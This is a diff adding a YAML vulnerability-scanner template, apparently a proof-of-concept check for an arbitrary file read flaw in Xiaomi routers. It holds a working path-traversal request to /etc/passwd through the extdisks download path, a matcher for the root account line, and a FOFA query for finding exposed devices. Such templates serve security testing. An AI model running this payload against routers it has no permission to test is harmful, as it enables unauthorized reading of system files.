@@ -1,0 +1,15 @@
+id: poc-yaml-xiaomi-extdisks-any-fileread
+info:
+  name: 小米路由器 extdisks任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 小米路由器
+  fofa: app="小米路由器"
+requests:
+- method: GET
+  path: /api-third-party/download/extdisks../etc/passwd
+  expression: "status_code == 200 && \nmatches(body, \"root:.*:0:0:\") &&\n!contains(body,\"\
+    <\")\n"
+variables: {}
+transport: http
